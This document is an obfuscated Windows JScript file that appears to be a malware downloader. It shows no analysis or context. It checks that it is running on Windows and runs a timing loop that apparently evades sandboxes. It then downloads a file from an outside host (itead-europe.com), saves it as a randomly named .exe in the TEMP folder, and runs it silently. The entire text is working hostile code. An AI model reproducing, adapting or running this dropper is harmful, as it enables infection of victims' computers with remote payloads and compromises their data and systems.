var _BS = false;
var _U = "CreateObject";
var _ZL = function _B() {return WScript[_U]("WScript"+".Shell");}(), _W0 = 11;
var _E0 = "MSXML2.XMLHTTP";
var _QF = 2123213;
var _MW = 0;
function _LY(_IX){_ZL["Run"](_IX, _MW, _MW);};
function _BK(){return _E0 + "";};
function _C(_WP, _BZ){_MW = _MW * 1; return _WP - _BZ;};
function _L(){return _U;};
/*@cc_on
  @if (@_win32 || @_win64)
    _BS = true;
  @end
@*/
if (_BS)
{
var _UE = "";
function _EM(){return 22;};
var _Q = 0; var _W = 0;
function _DF()
{
var _AG = new this["Date"]();
var _O = _AG["getUTCMilliseconds"]();
WScript["Sleep"](_EM());
var _AG = new this["Date"]();
var _MQ = _AG["getUTCMilliseconds"]();
WScript["Sleep"](_EM());
var _AG = new this["Date"]();
var _VQ = _AG["getUTCMilliseconds"]();
var _Q = "_T";
_Q = _C(_MQ, _O);
var _W = "_YS";
_W = _C(_VQ, _MQ);
_UE = "open";
return _C(_Q, _W);
}
var _L0 = false;
var _JL = false;
for (var _J0 = _MW; _J0 < _EM() * 1; _J0++){if (_DF() != _MW){
_L0 = true; 
_W = "31" + 11 * _Q + _W; 
_JL = true; 
break;
}}
function _M() {return ((_L0 == true) && (_L0 == _JL)) ? 1 : _MW;};
if (_L0 && _M() && _JL){
function _VC() {return _ZL["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "5RZgVkVRuZN2.ex" + "e";};
 _T0 = _BK();
 _IW = WScript[_U](_T0);
 var _J = 1;
 while (_J){
try {
	if (_J == 1)
	{
		_IW[_UE]("GET", "http://itead-europe.com/k3ias", false);
		_IW["send"]();
		_G = "Sleep";
	}
	WScript[_G](_EM() + 120); 
	if (_IW["readystate"] < 2 * 2) continue;
	_J = _MW;
	function _JY(_S) {var _E = (1, 2, 3, 4, 5, _S); return _E;};
	_TD = WScript[_L()]("ADODB.Stream");
	_T0 = _TD;
	_T0[_UE]();
	_T0["type"] = _JY(1);
	_T0["write"](_IW["ResponseBody"]);
	_TD["position"] = _JY(_MW);
	_T0["Save" + "ToFile"](_VC(), 2);
	_TD["cl"+"ose"]();
	_LS = _VC();
	_LY(_LS);
} catch(_X){};
}
}
}

